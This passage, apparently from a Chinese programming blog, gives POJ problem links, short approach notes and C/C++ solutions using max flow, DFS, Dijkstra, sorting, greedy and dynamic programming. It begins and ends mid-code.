( d &gt; <span class="number">0</span>) &#123;</div><div class="line">                e.cap -= d;</div><div class="line">                G[e.to][e.rev].cap += d;</div><div class="line">                <span class="keyword">return</span> d;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max_flow</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> t)</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> flow = <span class="number">0</span>;</div><div class="line">    <span class="keyword">for</span> (;;)&#123;</div><div class="line">        <span class="built_in">memset</span>(used, <span class="number">0</span>, <span class="keyword">sizeof</span>(used));</div><div class="line">        <span class="keyword">int</span> f = dfs(s,t,INF);</div><div class="line">        <span class="keyword">if</span> (f == <span class="number">0</span>) <span class="keyword">return</span> flow;</div><div class="line">        flow += f;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n,&amp;m) != EOF)&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++ )</div><div class="line">            G[i].clear();</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">            <span class="keyword">int</span> s, t,c;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;s,&amp;t,&amp;c);</div><div class="line">            add_edge(s,t,c);</div><div class="line">        &#125;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,max_flow(<span class="number">1</span>,m));</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1979"><a href="#1979" class="headerlink" title="1979"></a>1979</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=1979" target="_blank" rel="external">http://poj.org/problem?id=1979</a></p>
<h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>DFS()</p>
<h3 id="提交-3"><a href="#提交-3" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> X 20</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> Y 20</span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> x,y;</div><div class="line"><span class="keyword">int</span> nx,ny;</div><div class="line"><span class="keyword">int</span> sx,sy;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="keyword">char</span> maze[X][Y];</div><div class="line"><span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    num += <span class="number">1</span>;</div><div class="line">    maze[r][s] = <span class="string">'#'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</div><div class="line">        <span class="keyword">int</span> t1 = r+dx[i];</div><div class="line">        <span class="keyword">int</span> t2 = s+dy[i];</div><div class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt;= t1 &amp;&amp; t1 &lt; x &amp;&amp; <span class="number">0</span> &lt;= t2 &amp;&amp; t2 &lt; y &amp;&amp; maze[t1][t2] == <span class="string">'.'</span>)&#123;</div><div class="line">            dfs(t1,t2);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>( x != <span class="number">0</span> &amp;&amp; y != <span class="number">0</span>)&#123;</div><div class="line">        num  = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; x; i++)&#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; y; j++)&#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;maze[i][j]);</div><div class="line">                <span class="keyword">if</span> (maze[i][j] == <span class="string">'@'</span>)&#123;</div><div class="line">                    sx = i;</div><div class="line">                    sy = j;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        dfs(sx,sy);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,num);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2387"><a href="#2387" class="headerlink" title="2387"></a>2387</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=2387" target="_blank" rel="external">http://poj.org/problem?id=2387</a></p>
<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p>最短路径 +　队列优先　。<br>这题竟然是先读入边数再读入顶点数，Ｏrz<br>另外会有 重边， 不过如果用邻接表实现的话，可以不用管，如果邻接矩阵来实现的话，最后矩阵中存储的是从点到点的多条边的最小值。</p>
<h3 id="提交-4"><a href="#提交-4" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;queue&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_V 200000</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xFFFFFF</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">struct</span> edge &#123; <span class="keyword">int</span> to, cost, flag ;&#125;;</div><div class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</div><div class="line"></div><div class="line"><span class="keyword">int</span> V;</div><div class="line"><span class="keyword">int</span> E;</div><div class="line"><span class="built_in">vector</span>&lt;edge&gt; G[MAX_V];</div><div class="line"><span class="keyword">int</span> d[MAX_V];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;E,&amp;V);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++)&#123;</div><div class="line">        <span class="keyword">int</span> s, t, cost;</div><div class="line">        edge temp1,temp2;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>, &amp;s, &amp;t, &amp;cost);</div><div class="line">        temp1.to = t;</div><div class="line">        temp1.cost = cost;</div><div class="line">        G[s].push_back(temp1);</div><div class="line"></div><div class="line"></div><div class="line">        temp2.to = s;</div><div class="line">        temp2.cost = cost;</div><div class="line">        G[t].push_back(temp2);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[V]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    priority_queue&lt;P, <span class="built_in">vector</span>&lt;P&gt;, greater&lt;P&gt; &gt; que;</div><div class="line"></div><div class="line">    fill(d+<span class="number">1</span>,d + V+<span class="number">1</span>, INF);</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line">    que.push(P(<span class="number">0</span>,s));</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( !que.empty())&#123;</div><div class="line">        P p = que.top();</div><div class="line">        que.pop();</div><div class="line">        <span class="keyword">int</span> v = p.second;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> ( d[v] &lt; p.first)</div><div class="line">            <span class="keyword">continue</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; G[v].size(); i++)&#123;</div><div class="line">            edge e = G[v][i];</div><div class="line">            <span class="keyword">if</span> ( d[e.to] &gt; d[v] + e.cost) &#123;</div><div class="line">                d[e.to] = d[v] + e.cost;</div><div class="line">                que.push(P(d[e.to], e.to));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2388"><a href="#2388" class="headerlink" title="2388"></a>2388</h2><h3 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=2388" target="_blank" rel="external">http://poj.org/problem?id=2388</a></p>
<h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>先排序，之后打印出中间值。水题。</p>
<h3 id="提交-5"><a href="#提交-5" class="headerlink" title="提交"></a>提交</h3><h4 id="stl"><a href="#stl" class="headerlink" title="stl"></a>stl</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> arr[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i]);</div><div class="line">    &#125;</div><div class="line">    sort(arr,arr+n);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arr[n/<span class="number">2</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="快排"><a href="#快排" class="headerlink" title="快排"></a>快排</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> arr[MAX];</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> h)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(h&lt;l+<span class="number">2</span>)<span class="keyword">return</span> ;</div><div class="line">    <span class="keyword">int</span> e=h,p=l;</div><div class="line">    <span class="keyword">while</span>(l&lt;h)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">while</span>(++l&lt;e &amp;&amp; arr[l]&lt;=arr[p]);</div><div class="line">        <span class="keyword">while</span>(--h&gt;p &amp;&amp; arr[h]&gt;=arr[p]);</div><div class="line">        <span class="keyword">if</span>(l&lt;h) swap(arr[l],arr[h]);</div><div class="line">    &#125;</div><div class="line">    swap(arr[h],arr[p]);</div><div class="line">    quick_sort(p,h);</div><div class="line">    quick_sort(l,e);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i]);</div><div class="line">    &#125;</div><div class="line">    quick_sort(<span class="number">0</span>,n);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arr[n/<span class="number">2</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3069"><a href="#3069" class="headerlink" title="3069"></a>3069</h2><h3 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3069" target="_blank" rel="external">http://poj.org/problem?id=3069</a></p>
<h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>贪心算法。在 <code>while( i &lt; n )</code> 循环中，第一个while循环，找到距离当前点（未覆盖）大于r的第一个点，该点的前一个（i—）做上标记。第二个while循环，从已经标记的点出发，找到距离当前点（已经覆盖）大于r的第一个点，并将其作为下一次大循环的起点。</p>
<h3 id="提交-6"><a href="#提交-6" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> N 1005</span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> r;</div><div class="line"><span class="keyword">int</span> loc[N];</div><div class="line"><span class="keyword">int</span> marknum;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;r,&amp;n);</div><div class="line">    <span class="keyword">while</span> ( n != <span class="number">-1</span> &amp;&amp; r != <span class="number">-1</span>)&#123;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;loc[i]);</div><div class="line">        sort(loc,loc+n);</div><div class="line">        marknum = <span class="number">0</span>;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> ( i &lt; n )&#123;</div><div class="line">            <span class="keyword">while</span> ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i] )</div><div class="line">                i++;</div><div class="line">            i--;</div><div class="line">            marknum++;</div><div class="line">            j = i;</div><div class="line"></div><div class="line">            <span class="keyword">while</span> ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i])</div><div class="line">                i++;</div><div class="line"></div><div class="line">            j = i;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,marknum);</div><div class="line"></div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;r,&amp;n);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3176"><a href="#3176" class="headerlink" title="3176"></a>3176</h2><h3 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3176" target="_blank" rel="external">http://poj.org/problem?id=3176</a></p>
<h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><p>二维数组triangle用于保存三角形，二维数组way用于保存路径。<br>以题目数据为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">7</div><div class="line">3 8</div><div class="line">8 1 0</div><div class="line">2 7 4 4</div><div class="line">4 5 2 6 5</div></pre></td></tr></table></figure></p>
<p>分为三种情况：</p>
<ul>
<li>最左边，只能从上一行的同列来，way[i][j] = way[i-1][j] + triangle[i][j]</li>
<li>最右边，只能从上一行的斜对角线来，way[i-1][j-1] + triangle[i][j];</li>
<li>中间，可以从上一行的左边或者右边来，way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j];</li>
</ul>
<p>填表完成后，对最后一行way[n-1][]找出最大值即为答案。</p>
<h3 id="提交-7"><a href="#提交-7" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 355</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> way[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> triangle[MAX][MAX] = &#123;<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;triangle[i][j]);</div><div class="line"></div><div class="line">    way[<span class="number">0</span>][<span class="number">0</span>] = triangle[<span class="number">0</span>][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++)</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; j++)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ( j == <span class="number">0</span> )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( j == i )</div><div class="line">            &#123;</div><div class="line">                way[i][j] = way[i<span class="number">-1</span>][j<span class="number">-1</span>] + triangle[i][j];</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span></div><div class="line">            &#123;</div><div class="line">                way[i][j] = max(way[i<span class="number">-1</span>][j],way[i<span class="number">-1</span>][j<span class="number">-1</span>]) + triangle[i][j];</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    <span class="keyword">int</span> lastrow = n - <span class="number">1</span>;</div><div class="line">    <span class="keyword">int</span> res = way[lastrow][<span class="number">0</span>];</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt; n; j++)&#123;</div><div class="line">        <span class="keyword">if</span> (way[lastrow][j] &gt; res )</div><div class="line">            res = way[lastrow][j];</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, res);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3253"><a href="#3253" class="headerlink" title="3253"></a>3253</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3253" target="_blank" rel="external">http://poj.org/problem?id=3253</a></p>
<h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>霍夫曼树的变形。<br>重点在于对两个最小值相加后对数组的处理。</p>
<h3 id="提交-8"><a href="#提交-8" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 